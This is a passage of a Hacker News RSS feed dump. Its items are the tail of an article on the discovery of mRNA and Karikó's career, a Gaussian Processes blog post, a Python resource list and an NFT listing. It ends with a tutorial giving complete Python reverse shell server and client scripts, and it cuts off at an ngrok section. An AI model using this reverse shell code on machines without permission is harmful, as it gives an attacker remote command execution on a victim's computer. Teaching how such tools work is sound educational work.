<p>Jacob, a physician who‚Äôd been forced from medical school when Germany invaded France in 1940 and spent the war years fighting with Charles de Gaulle‚Äôs Free French Forces, called this theoretical intermediary ‚ÄúX.‚Äù Other researchers ‚Äúrolled their eyes in horror‚Äù when he presented his theory, Jacob recalled in his memoir, <em>The Statue Within</em>. ‚ÄúWith a little encouragement, my audience would have jeered and left,‚Äù he wrote.</p>
<div id="attachment_1216833"><p><img data-sizes="auto" src="https://www.macleans.ca/wp-content/uploads/2021/02/MATTHEW-MESELSON-DNA-FRANGOU-FEB02-766x431.jpg" alt="Meselson at Caltech in 1958 (Courtesy of the Caltech Archives)" width="766" height="431"></p><p>Meselson at Caltech in 1958 (Courtesy of the Caltech Archives)</p></div>
<p>In spring 1960, Jacob wrote to Meselson with a proposal: he and Sydney Brenner, a South African biologist at the University of Cambridge, would meet at Meselson‚Äôs lab at Caltech to find X. Meselson, who was in his first year on faculty, had developed a technique to track smaller molecules inside a cell. Jacob believed this technique would help identify X. That summer, with Jacob and Brenner in his lab, Meselson set up initial cultures and tests. Brenner took over the operations, while Jacob sat in a chair taking notes‚Äîpain from bomb fragments in his legs was worsened by the California humidity, says Meselson. For three weeks, they met with one failure after another. The ribosomes kept falling apart. Other scientists poked their heads in periodically and asked sarcastically for news of X. Jacob wrote that they ‚Äúcame to visit as one would visit the zoo.‚Äù On the trio‚Äôs very last scheduled day in the lab, Meselson, having given up on X, left. He flew to Boston to propose to his first wife.</p>
<p>Dejected, Jacob and Brenner went to Malibu Beach. The duo lay on the beach, watching huge waves of the Pacific crashing onto the sand and contemplating where their idea had gone wrong. Jacob wrote in his memoir: ‚ÄúSuddenly, Sydney gives a hoot. He leaps up, yelling, ‚ÄòThe magnesium! It‚Äôs the magnesium!‚Äô ‚Äù They raced back to the lab to run the experiment one last time, with additional magnesium. The result was spectacular. X existed.</p>
<blockquote><p><strong>READ:&nbsp;<a href="https://www.macleans.ca/news/theres-a-new-strain-of-covid-19-will-the-vaccines-work-against-it/">There‚Äôs a new strain of COVID-19. Will the vaccines work against it?</a></strong></p></blockquote>
<p>The pair gave a seminar the same day at Caltech to demonstrate X. Even then, no one believed them. They contacted Meselson in Boston that night to tell him. He was delighted. ‚ÄúIt didn‚Äôt occur to me that they would figure out what was going wrong on the very last day,‚Äù he says. When the trio published their findings in 1961, they renamed X as messenger RNA.</p>
<p>They did not imagine that their finding would be used for therapeutics or a vaccine. Their questions were more philosophical. Meselson says, ‚ÄúWe wondered what is it that allows you to put together the atoms of the ordinary periodic chart and end up with something that‚Äôs alive?‚Äù</p>
<p>Their work became the central tenet of molecular biology: DNA makes RNA makes protein makes life. It took another generation of scientists to find a way to harness RNA to treat and prevent illness.</p>
<p>***</p>
<p>As a kid in Kis√∫jsz√°ll√°s, Hungary, Katalin Karik√≥ watched her father, a butcher, dismember the carcasses of pigs. It was her first introduction to science. In the 1970s, while studying biochemistry at the University of Szeged, Karik√≥ heard about a new report from London: interferon, a type of protein made by the body to trigger a defence against a virus, was mediated by an RNA called 2-5A. Karik√≥ remembers a mentor talking to her about the discovery and being thrilled by the possibilities. He suggested to her that if they could make a synthetic version of a 2-5A molecule, they might be able to treat cancer or viral disease. ‚ÄúI immediately thought that what I was doing was tremendously important,‚Äù she says. It was the start of a 40-year quest to make synthetic RNA that could cure illness.</p>
<p>But she couldn‚Äôt secure funding in Hungary. Married with a two-year-old daughter, Karik√≥ saw no way to continue her work in her home country. She wrote to professors throughout Europe about joining their labs, but no one could hire her. In 1985, she received an offer from Temple University in Philadelphia. If she could get to the United States, a job was waiting for her.</p>
<p>At the time, Hungarian money could not legally be converted to another currency and taken out of the country. Worried about how their family would survive until her first paycheque, Karik√≥ and her husband, Bela Francia, sold their Russian-made car and converted the proceeds on the black market for a total of 900 British pounds. They sewed the money into their daughter‚Äôs teddy bear to smuggle it out of the country. The teddy bear‚Äôs owner, their daughter, Susan Francia, grew up to become a two-time Olympic gold medallist for the United States in rowing.</p>
<div id="attachment_1216834"><p><img data-sizes="auto" src="https://www.macleans.ca/wp-content/uploads/2021/02/KATALIN-KARIKO-MRNA-COVID-19-FRANGOU-FEB02.jpg" alt="Karik√≥ at home in Pennsylvania (Rachel Wisniewski)" width="820" height="547"></p><p>Karik√≥ at home in Pennsylvania (Rachel Wisniewski)</p></div>
<p>In their new home, things did not go as planned. Karik√≥‚Äôs bosses changed, she couldn‚Äôt get funding and she lost her job. Her supervisor cited her for deportation. Desperate to stay in the United States as her daughter entered first grade, Karik√≥ accepted a researcher post in Bethesda, Maryland. She commuted from Philadelphia every Monday morning at 3 a.m. and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.macleans.ca/society/science/scientists-mrna-covid-vaccines/">https://www.macleans.ca/society/science/scientists-mrna-covid-vaccines/</a></em></p>]]>
            </description>
            <link>https://www.macleans.ca/society/science/scientists-mrna-covid-vaccines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196372</guid>
            <pubDate>Fri, 19 Feb 2021 18:41:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CockroachDB's PR Organization Philosophy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26196334">thread link</a>) | @knz42
<br/>
February 19, 2021 | https://wiki.crdb.io/wiki/spaces/CRDB/pages/1411744698/Decomposing+changes+and+updating+PRs+during+reviews | <a href="https://web.archive.org/web/*/https://wiki.crdb.io/wiki/spaces/CRDB/pages/1411744698/Decomposing+changes+and+updating+PRs+during+reviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://wiki.crdb.io/wiki/spaces/CRDB/pages/1411744698/Decomposing+changes+and+updating+PRs+during+reviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196334</guid>
            <pubDate>Fri, 19 Feb 2021 18:37:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gaussian Processes: from one to many outputs]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26196255">thread link</a>) | @wesselb
<br/>
February 19, 2021 | https://invenia.github.io/blog/2021/02/19/OILMM-pt1/ | <a href="https://web.archive.org/web/*/https://invenia.github.io/blog/2021/02/19/OILMM-pt1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>19 Feb 2021</span></p>
  <p>This is the first post in a three-part series we are preparing on multi-output Gaussian Processes. Gaussian Processes (GPs) are a popular tool in machine learning, and a technique that we routinely use in our work.
Essentially, GPs are a powerful Bayesian tool for regression problems (which can be extended to classification problems through some modifications).
As a Bayesian approach, GPs provide a natural and automatic mechanism to construct and calibrate uncertainties.
Naturally, getting <em>well</em>-calibrated uncertainties is not easy and depends on a combination of how well the model matches the data and on how much data is available.
Predictions made using GPs are not just point predictions: they are whole probability distributions, which is convenient for downstream tasks. There are several good references for those interested in learning more about the benefits of Bayesian methods, from <a href="https://towardsdatascience.com/an-introduction-to-bayesian-inference-e6186cfc87bc">introductory</a> <a href="https://towardsdatascience.com/what-is-bayesian-statistics-used-for">blog posts</a> to <a href="https://probml.github.io/pml-book/book0.html">classical</a> <a href="http://www.stat.columbia.edu/~gelman/book/">books</a>.</p>

<p>In this post (and in the forthcoming ones in this series), we are going to assume that the reader has some level of familiarity with GPs in the single-output setting.
We will try to keep the maths to a minimum, but will rely on mathematical notation whenever that helps making the message clear.
For those who are interested in an introduction to GPs‚Äîor just a refresher‚Äîwe point towards <a href="https://distill.pub/2019/visual-exploration-gaussian-processes/">other</a> <a href="https://medium.com/analytics-vidhya/intuitive-intro-to-gaussian-processes-328740cdc37f">resources</a>.
For a rigorous and in-depth introduction, the <a href="http://www.gaussianprocess.org/gpml/">book by Rasmussen and Williams</a> stands as one of the best references (and it is made freely available in electronic form by the authors).</p>

<p>We will start by discussing the extension of GPs from one to multiple dimensions, and review popular (and powerful) approaches from the literature.
In the following posts, we will look further into some powerful tricks that bring improved scalability and will also share some of our code.</p>

<h2 id="multi-output-gps">Multi-output GPs</h2>

<p>While most people with a background in machine learning or statistics are familiar with GPs, it is not uncommon to have only encountered their single-output formulation.
However, many interesting problems require the modelling of multiple outputs instead of just one.
Fortunately, it is simple to extend single-output GPs to multiple outputs, and there are a few different ways of doing so. We will call these constructions multi-output GPs (MOGPs).</p>

<p>An example application of a MOGP might be to predict both temperature and humidity as a function of time. Sometimes we might want to include binary or categorical outputs as well, but in this article we will limit the discussion to real-valued outputs.
(MOGPs are also sometimes called multi-task GPs, in which case an output is instead referred to as a task. But the idea is the same.)
Moreover we will refer to inputs as time, as in the time series setting, but all the discussion in here is valid for any kind of input.</p>

<p>The simplest way to extend GPs to multi-output problems is to model each of the outputs independently, with single-output GPs.
We call this model IGPs (for independent GPs). While conceptually simple, computationally cheap, and easy to implement, this approach fails to account for correlations between outputs.
If the outputs are correlated, knowing one can provide useful information about others (as we illustrate below), so assuming independence can hurt performance and, in many cases, limit it to being used as a baseline.</p>

<p>To define a general MOGP, all we have to do is to also specify how the outputs covary.
Perhaps the simplest way of doing this is by prescribing an additional covariance function (kernel) over outputs, \(k_{\mathrm{o}}(i, j)\), which specifies the covariance between outputs \(i\) and \(j\).
Combining this kernel over outputs with a kernel over inputs, e.g. \(k_{\mathrm{t}}(t, t')\), the full kernel of the MOGP is then given by</p><p>

\[\begin{equation}

k((i, t), (j, t')) = \operatorname{cov}(f_i(t), f_j(t')) = k_{\mathrm{o}}(i, j) k_{\mathrm{t}}(t, t'),

\end{equation}\]

</p><p>which says that the covariance between output \(i\) at input \(t\) and output \(j\) at input \(t'\) is equal to the product \(k_{\mathrm{o}}(i, j) k_{\mathrm{t}}(t, t')\).
When the kernel \(k((i, t), (j, t'))\) is a product between a kernel over outputs \(k_{\mathrm{o}}(i, j)\) and a kernel over inputs \(k_{\mathrm{t}}(t,t‚Äô)\), the kernel \(k((i, t), (j, t'))\) is called <em>separable</em>.
In the general case, the kernel \(k((i, t), (j, t'))\) does not have to be separable, i.e. it can be any arbitrary <a href="https://en.wikipedia.org/wiki/Positive-definite_function">positive-definite function</a>.</p>

<p>Contrary to IGPs, general MOGPs do model correlations between outputs, which means that they are able to use observations from one output to better predict another output.
We illustrate this below by contrasting the predictions for two of the outputs in the <a href="https://sccn.ucsd.edu/~arno/fam2data/publicly_available_EEG_data.html">EEG dataset</a>, one observed and one not observed, using IGPs and another flavour of MOGPs, the ILMM, which we will discuss in detail in the next section. Contrary to the independent GP (IGP), the ILMM is able to successfully predict F2 by exploiting the observations for F3 (and other outputs not shown).</p>

<p><img src="https://invenia.github.io/blog/public/images/eeg.png" alt="IGP_vs_MOGP">
Figure 1: Predictions for two of the outputs in the EEG dataset using two distinct MOGP approaches, the ILMM and the IGP.
All outputs are modelled jointly, but we only plot two of them for clarity.</p>

<h3 id="equivalence-to-single-output-gps">Equivalence to single-output GPs</h3>

<p>An interesting thing to notice is that a general MOGP kernel is just another kernel, like those used in single-output GPs, but one that now operates on an <em>extended</em> input space (because it also takes in \(i\) and \(j\) as input).
Mathematically, say one wants to model \(p\) outputs over some input space \(\mathcal{T}\).
By also letting the index of the output be part of the input, we can construct this extended input space: \(\mathcal{T}_{\mathrm{ext}} = \{1,...,p\} \times \mathcal{T}\). Then, a multi-output Gaussian process (MOGP) can be defined via a mean function, \(m\colon \mathcal{T}_{\mathrm{ext}} \to \mathbb{R}\), and a kernel, \(k\colon \mathcal{T}_{\mathrm{ext}}^2 \to \mathbb{R}\).
Under this construction it is clear that any property of single-output GPs immediately transfers to MOGPs, because MOGPs can simply be seen as single-output GPs on an extended input space.</p>

<p>An equivalent formulation of MOGPs can be obtained by stacking the multiple outputs into a vector, creating a <em>vector-valued GP</em>.
It is sometimes helpful to view MOGPs from this perspective, in which the multiple outputs are viewed as one multidimensional output.
We can use this equivalent formulation to define MOGP via a <em>vector-valued</em> mean function, \(m\colon \mathcal{T} \to \mathbb{R}^p\), and a <em>matrix-valued</em> kernel, \(k\colon\mathcal{T}^2 \to \mathbb{R}^{p \times p}\). This mean function and kernel are <em>not</em> defined on the extended input space; rather, in this equivalent formulation, they produce <em>multi-valued outputs</em>.
The vector-valued mean function corresponds to the mean of the vector-valued GP, \(m(t) = \mathbb{E}[f(t)]\), and the matrix-valued kernel to the covariance matrix of vector-valued GP, \(k(t, t‚Äô) = \mathbb{E}[(f(t) - m(t))(f(t‚Äô) - m(t‚Äô))^\top]\).
When the matrix-valued kernel is evaluated at \(t = t‚Äô\), the resulting matrix \(k(t, t) =  \mathbb{E}[(f(t) - m(t))(f(t) - m(t))^\top]\) is sometimes called the <em>instantaneous spatial covariance</em>: it describes a covariance between different outputs at a given point in time \(t\).</p>

<p>Because MOGPs can be viewed as single-output GPs on an extended input space, inference works exactly the same way.
However, by extending the input space we exacerbate the scaling issues inherent with GPs, because the total number of observations is counted by adding the numbers of observations for each output, and GPs scale badly in the number of observations.
While inference in the single-output setting requires the inversion of an \(n \times n\) matrix (where \(n\) is the number of data points), in the case of \(p\) outputs, assuming that at all times all outputs are observed,<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> this turns into the inversion of an \(np \times np\) matrix (assuming the same number of input points for each output as in the single output case), which can quickly become computationally intractable (i.e. not feasible to compute with limited computing power and time).
That is because the inversion of a \(q \times q\) matrix takes \(\mathcal{O}(q^3)\) time and \(\mathcal{O}(q^2)\) memory, meaning that time and memory performance will scale, respectively, cubically and quadratically on the number of points in time, \(n\), and outputs, \(p\).
In practice this scaling characteristic limits the application of this general MOGP formulation to data sets with very few outputs and data points.</p>

<h3 id="low-rank-approximations">Low-rank approximations</h3>

<p>A popular and powerful approach to making MOGPs computationally tractable is to impose a <a href="https://en.wikipedia.org/wiki/Rank_(linear_algebra)">low-rank</a> structure over the covariance between outputs.
That is equivalent to assuming that the data can be described by a set of latent (unobserved) Gaussian processes in which the number of these <em>latent processes</em> is fewer than the number of outputs.
This builds a simpler lower-dimensional representation of the data. The structure imposed over the covariance matrices through this lower-dimensional representation of the data can be exploited to perform the inversion operation more efficiently (we are going to discuss in detail one of these cases in the next post of this series).
There are a variety of different ways in which this kind of structure can be imposed, leading to an interesting class of models which we discuss in the next section.</p>

<p>This kind of assumption is typically used to make the method computationally cheaper.
However, these assumptions do bring extra <a href="https://en.wikipedia.org/wiki/Inductive_bias">inductive bias</a> to the model. Introducing inductive bias <a href="https://towardsdatascience.com/supercharge-your-model-performance-with-inductive-bias-48559dba5133">can be a powerful tool</a> in making the model more data-efficient and better-performing in practice, provided that such assumptions are adequate to the particular problem at hand.
For instance, <a href="https://epubs.siam.org/doi/pdf/10.1137/18M1183480">low-rank data</a> <a href="https://ieeexplore.ieee.org/document/1177153">occurs naturally</a> in <a href="https://www.sciencedirect.com/science/article/abs/pii/S0005109807003950">different settings</a>.
This also happens to be true in electricity grids, due to the <a href="https://lib.dr.iastate.edu/cgi/viewcontent.cgi?article=1031&amp;context=econ_las_conf">mathematical structure</a> of the ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://invenia.github.io/blog/2021/02/19/OILMM-pt1/">https://invenia.github.io/blog/2021/02/19/OILMM-pt1/</a></em></p>]]>
            </description>
            <link>https://invenia.github.io/blog/2021/02/19/OILMM-pt1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196255</guid>
            <pubDate>Fri, 19 Feb 2021 18:30:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Resources for Everybody]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26196218">thread link</a>) | @EntICOnc
<br/>
February 19, 2021 | https://learnbyexample.github.io/py_resources/ | <a href="https://web.archive.org/web/*/https://learnbyexample.github.io/py_resources/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav id="sidebar" aria-label="Table of contents"></nav><div id="page-wrapper"><div class="page"><div id="content"><main><h2><a href="#about" id="about">About</a></h2><p>This is a collection of Python <strong>learning</strong> resources. Many of the resources, especially the beginner ones, are free.</p><p><img src="https://learnbyexample.github.io/py_resources/images/info.svg" alt="info"> For a curated list of frameworks, libraries, software, etc, see <a href="https://github.com/vinta/awesome-python">awesome-python</a></p><h2><a href="#img-srcimageswarningsvg-altwarning--disclaimer-and-disclosure" id="img-srcimageswarningsvg-altwarning--disclaimer-and-disclosure"><img src="https://learnbyexample.github.io/py_resources/images/warning.svg" alt="warning"> Disclaimer and Disclosure</a></h2><p>I don't have personal experience with majority of the resources mentioned here. I have collected them from various recommendation threads on Reddit, Hacker News, Stackexchange sites, Twitter, GitHub, etc.</p><p><a href="https://learnbyexample.github.io/py_regular_expressions/">Python re(gex)?</a> and <a href="https://learnbyexample.github.io/100_page_python_intro/">100 Page Python Intro</a> are my own books.</p><h2><a href="#table-of-contents" id="table-of-contents">Table of Contents</a></h2><ul><li><a href="https://learnbyexample.github.io/py_resources/beginners.html">Beginner resources</a> <ul><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#new-to-programming">New to programming</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#new-to-python">New to Python</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#courses-with-certificates">Courses with certificates</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#exercises">Exercises</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#projects">Projects</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#debugging">Debugging</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#tools-ide-and-text-editors">Tools, IDE and Text Editors</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#cheatsheets">Cheatsheets</a></li><li><a href="https://learnbyexample.github.io/py_resources/beginners.html#documentation-and-getting-help">Documentation and getting help</a></li></ul></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html">Specific features</a> <ul><li><a href="https://learnbyexample.github.io/py_resources/specific.html#async-and-concurrency">Async and concurrency</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#command-line-applications">Command line applications</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#context-managers">Context managers</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#decorators-and-closures">Decorators and closures</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#iterables-generators-yield-itertools">Iterables, Generators, Yield, Itertools</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#lambda">Lambda</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#lists-and-comprehensions">Lists and comprehensions</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#memoization">Memoization</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#os-interaction">OS interaction</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#profiling-code-and-speeding-up-python">Profiling code and speeding up Python</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#regular-expressions">Regular Expressions</a></li><li><a href="https://learnbyexample.github.io/py_resources/specific.html#virtual-environments-and-packaging">Virtual Environments and Packaging</a></li></ul></li><li><a href="https://learnbyexample.github.io/py_resources/intermediate.html">Intermediate to Advanced resources</a> <ul><li><a href="https://learnbyexample.github.io/py_resources/intermediate.html#intermediate">Intermediate</a></li><li><a href="https://learnbyexample.github.io/py_resources/intermediate.html#testing">Testing</a></li><li><a href="https://learnbyexample.github.io/py_resources/intermediate.html#algorithms-and-data-structures">Algorithms and data structures</a></li><li><a href="https://learnbyexample.github.io/py_resources/intermediate.html#design-patterns">Design patterns</a></li><li><a href="https://learnbyexample.github.io/py_resources/intermediate.html#advanced">Advanced</a></li></ul></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html">Domain specific resources</a> <ul><li><a href="https://learnbyexample.github.io/py_resources/domain.html#bioinformatics">Bioinformatics</a></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html#data-science">Data Science</a></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html#gui-and-games">GUI and Games</a></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html#machine-learning">Machine Learning</a></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html#robotics-and-computer-vision">Robotics and Computer Vision</a></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html#scientific-computing">Scientific computing</a></li><li><a href="https://learnbyexample.github.io/py_resources/domain.html#web-development">Web development</a></li></ul></li></ul><h2><a href="#acknowledgements" id="acknowledgements">Acknowledgements</a></h2><ul><li><a href="https://github.com/rust-lang/mdBook">mdBook</a></li><li><a href="https://github.com/JorelAli/mdBook-pagetoc">mdBook-pagetoc</a></li><li><a href="https://github.com/wilsonzlin/minify-html">minify-html</a></li><li><a href="https://commons.wikimedia.org/wiki/File:Warning_icon.svg">Warning</a> and <a href="https://commons.wikimedia.org/wiki/File:Info_icon_002.svg">Info</a> icons by <a href="https://commons.wikimedia.org/wiki/User:Amada44">Amada44</a> under public domain</li><li><a href="https://inkscape.org/">Inkscape</a></li><li><a href="https://github.com/RazrFalcon/svgcleaner">svgcleaner</a></li></ul><h2><a href="#license" id="license">License</a></h2><p>This work is licensed under a <a href="https://github.com/learnbyexample/py_resources/blob/master/LICENSE">Creative Commons Zero v1.0 Universal License</a></p></main><nav aria-label="Page navigation"><a rel="next" href="https://learnbyexample.github.io/py_resources/beginners.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right"> <i></i> </a></nav></div></div><nav aria-label="Page navigation"><a rel="next" href="https://learnbyexample.github.io/py_resources/beginners.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right"> <i></i> </a></nav></div></div>]]>
            </description>
            <link>https://learnbyexample.github.io/py_resources/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196218</guid>
            <pubDate>Fri, 19 Feb 2021 18:27:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nyan Cat on the Blockchain]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 88 (<a href="https://news.ycombinator.com/item?id=26196027">thread link</a>) | @awaxman11
<br/>
February 19, 2021 | https://foundation.app/NyanCat/nyan-cat-219 | <a href="https://web.archive.org/web/*/https://foundation.app/NyanCat/nyan-cat-219">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Nyan Cat is the name of an animation uploaded on April 2 2011, and became a viral internet sensation. The design of Nyan Cat was inspired by my cat Marty, who crossed the Rainbow Bridge but lives on in spirit.</p><p>I am the original artist behind the iconic GIF and have remastered the image for its 10 year anniversary.  Owning this piece grants the following stats:</p><p>Charisma +10<br>Luck +10<br>Happiness +15</p><hr><p>1400x1400 - 12 Frames</p></div></div>]]>
            </description>
            <link>https://foundation.app/NyanCat/nyan-cat-219</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196027</guid>
            <pubDate>Fri, 19 Feb 2021 18:12:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Reverse Shell with Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26196026">thread link</a>) | @axju
<br/>
February 19, 2021 | https://axju.de/posts/2021/02/a-reverse-shell-with-python/ | <a href="https://web.archive.org/web/*/https://axju.de/posts/2021/02/a-reverse-shell-with-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><strong>Disclaimer</strong>: The described methods should only be used for systems which you
have access rights. I used this method to get access to my mums PC, which I was
allowed. And yes, I'm 31, have my own family, but still help my mom with her PC.</p>
<p><img alt="alternate text" src="https://axju.de/images/articels/security/reverse-shell-003.gif"></p><div id="some-basics">
<h2>Some basics</h2>
<p>What is a reverse shell? With a reverse shell, the target makes the connection.
On your client is run a server program, which listening for incoming
connections. And the target execute a program, which connect to your client.
Then you can run commands on the target from your client. My research:</p>
<blockquote>
<ul>
<li><a href="https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/">Acunetix</a></li>
<li><a href="https://www.thepythoncode.com/article/create-reverse-shell-python">PythonCode</a></li>
<li><a href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">netsparker</a></li>
</ul>
</blockquote>
</div>
<div id="python">
<h2>Python</h2>
<p>We will write two small Python scripts one for the server and one for the
client. The only modules we use are
<a href="https://docs.python.org/3/library/socket.html">sockets</a> and the
<a href="https://docs.python.org/3/library/subprocess.html">subprocess</a>. Make sure you
have read the documentation. The programs are short and self-explanatory,
nothing complicated just a little loop.</p>
<div id="server">
<h3>Server</h3>
<div><pre><span></span><span>import</span> <span>socket</span>

<span>HOST</span> <span>=</span> <span>'0.0.0.0'</span>
<span>PORT</span> <span>=</span> <span>5555</span>

<span># set up the socket so that it waits for an incoming connection</span>
<span>s</span> <span>=</span> <span>socket</span><span>.</span><span>socket</span><span>()</span>
<span>s</span><span>.</span><span>setsockopt</span><span>(</span><span>socket</span><span>.</span><span>SOL_SOCKET</span><span>,</span> <span>socket</span><span>.</span><span>SO_REUSEADDR</span><span>,</span> <span>1</span><span>)</span>
<span>s</span><span>.</span><span>bind</span><span>((</span><span>HOST</span><span>,</span> <span>PORT</span><span>))</span>
<span>s</span><span>.</span><span>listen</span><span>(</span><span>1</span><span>)</span>
<span>print</span><span>(</span><span>f</span><span>'[*] listening as </span><span>{</span><span>HOST</span><span>}</span><span>:</span><span>{</span><span>PORT</span><span>}</span><span>'</span><span>)</span>

<span># waiting for the target and sent a welcome message if it connected</span>
<span>client_s</span><span>,</span> <span>client_addr</span> <span>=</span> <span>s</span><span>.</span><span>accept</span><span>()</span>
<span>print</span><span>(</span><span>f</span><span>'[*] client connected </span><span>{</span><span>client_addr</span><span>}</span><span>'</span><span>)</span>
<span>client_s</span><span>.</span><span>send</span><span>(</span><span>'welcome'</span><span>.</span><span>encode</span><span>())</span>

<span># this loop will run, until you enter 'quit'</span>
<span>while</span> <span>True</span><span>:</span>

    <span># 1. enter the command and send it to the target</span>
    <span>cmd</span> <span>=</span> <span>input</span><span>(</span><span>'&gt;&gt;&gt; '</span><span>)</span>
    <span>client_s</span><span>.</span><span>send</span><span>(</span><span>cmd</span><span>.</span><span>encode</span><span>())</span>

    <span># check if you want to quit</span>
    <span>if</span> <span>cmd</span><span>.</span><span>lower</span><span>()</span> <span>==</span> <span>'quit'</span><span>:</span>
        <span>break</span>

    <span># get the result of the command, executed on the target pc</span>
    <span>result</span> <span>=</span> <span>client_s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span><span>.</span><span>decode</span><span>()</span>
    <span>print</span><span>(</span><span>result</span><span>)</span>

<span>client_s</span><span>.</span><span>close</span><span>()</span>
<span>s</span><span>.</span><span>close</span><span>()</span>
</pre></div>
</div>
<div id="client">
<h3>Client</h3>
<div><pre><span></span><span>import</span> <span>socket</span>
<span>import</span> <span>subprocess</span>

<span>HOST</span> <span>=</span> <span>'0.0.0.0'</span>
<span>PORT</span> <span>=</span> <span>5555</span>

<span># set up the socket and connect to the server</span>
<span>s</span> <span>=</span> <span>socket</span><span>.</span><span>socket</span><span>()</span>
<span>s</span><span>.</span><span>connect</span><span>((</span><span>HOST</span><span>,</span> <span>PORT</span><span>))</span>

<span># get the welcome message</span>
<span>msg</span> <span>=</span> <span>s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span><span>.</span><span>decode</span><span>()</span>
<span>print</span><span>(</span><span>'[*] server:'</span><span>,</span> <span>msg</span><span>)</span>

<span># this loop will run until it receive 'quit'</span>
<span>while</span> <span>True</span><span>:</span>

    <span># receive the command and print it</span>
    <span>cmd</span> <span>=</span> <span>s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span><span>.</span><span>decode</span><span>()</span>
    <span>print</span><span>(</span><span>f</span><span>'[*] receive </span><span>{</span><span>cmd</span><span>}</span><span>'</span><span>)</span>

    <span># check if you want to quit</span>
    <span>if</span> <span>cmd</span><span>.</span><span>lower</span><span>()</span> <span>==</span> <span>'quit'</span><span>:</span>
        <span>break</span>

    <span># now run the command and get the result.</span>
    <span>try</span><span>:</span>
        <span>result</span> <span>=</span> <span>subprocess</span><span>.</span><span>check_output</span><span>(</span><span>cmd</span><span>,</span> <span>stderr</span><span>=</span><span>subprocess</span><span>.</span><span>STDOUT</span><span>,</span> <span>shell</span><span>=</span><span>True</span><span>)</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>result</span> <span>=</span> <span>str</span><span>(</span><span>e</span><span>)</span><span>.</span><span>encode</span><span>()</span>

    <span># if the command has no output, send 'ok' so the server knows everything is okay</span>
    <span>if</span> <span>len</span><span>(</span><span>result</span><span>)</span> <span>==</span> <span>0</span><span>:</span>
        <span>result</span> <span>=</span> <span>'OK'</span><span>.</span><span>encode</span><span>()</span>

    <span># send teh result to the server</span>
    <span>s</span><span>.</span><span>send</span><span>(</span><span>result</span><span>)</span>

<span>s</span><span>.</span><span>close</span><span>()</span>
</pre></div>
</div>
</div>
<div id="how-to-run">
<h2>How to run</h2>
<p>We only uses the Python Standard Library, so we don't have to install anything.
Simple execute</p>

<p>and</p>

<p><img alt="alternate text" src="https://axju.de/images/articels/security/reverse-shell-001.gif"></p><p>The server run with <em>HOST=0.0.0.0</em> so that it listen on all incoming connection.
On some examples you read something like <em>HOST=localhost</em> or <em>HOST=127.0.0.1</em>.
But then it's only listen on connection from the <em>localhost</em>. You shouldn't
change the <em>HOST</em> of the server script. But if you run the client on another PC,
you have to enter the IP address of the server for the <em>HOST</em>. You get a problem
if the PC is not in your local network. Of course you can forward the port in
your router and then specify your public IP as <em>HOST</em>. But I want to show you
another way.</p>
</div>
<div id="ngrok">
<h2>ngrok</h2>
